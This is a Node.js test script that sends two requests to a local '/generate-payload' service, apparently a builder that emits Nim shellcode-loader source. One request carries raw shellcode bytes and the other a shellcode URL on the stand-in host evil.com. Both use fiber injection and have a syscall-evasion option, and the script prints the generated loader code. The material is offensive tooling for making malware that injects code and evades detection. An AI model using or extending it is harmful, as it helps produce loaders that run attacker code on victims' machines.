const http = require('http');

const scenarios = [
    {
        label: "RAW SHELLCODE",
        payload: {
            name: "RawTest",
            output: "exe",
            shellcode: "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60",
            injection_method: "fiber",
            syscall_evasion: "none"
        }
    },
    {
        label: "HTTP SHELLCODE",
        payload: {
            name: "HttpTest",
            output: "exe",
            shellcode_url: "https://evil.com/shellcode.bin",
            injection_method: "fiber",
            syscall_evasion: "none"
        }
    }
];

function sendRequest(scenario) {
    const data = JSON.stringify(scenario.payload);
    const options = {
        hostname: 'localhost',
        port: 3000,
        path: '/generate-payload',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    console.log(`\n=== SCENARIO: ${scenario.label} ===`);
    const req = http.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            try {
                const json = JSON.parse(body);
                if (json.source_code) {
                    console.log("--- GENERATED NIM SOURCE ---");
                    console.log(json.source_code);
                    console.log("----------------------------");
                } else {
                    console.log("RESPONSE:", JSON.stringify(json, null, 2));
                }
            } catch (e) {
                console.log("Raw body:", body);
            }
        });
    });
    
    req.write(data);
    req.end();
}

scenarios.forEach((s, i) => setTimeout(() => sendRequest(s), i * 2000));
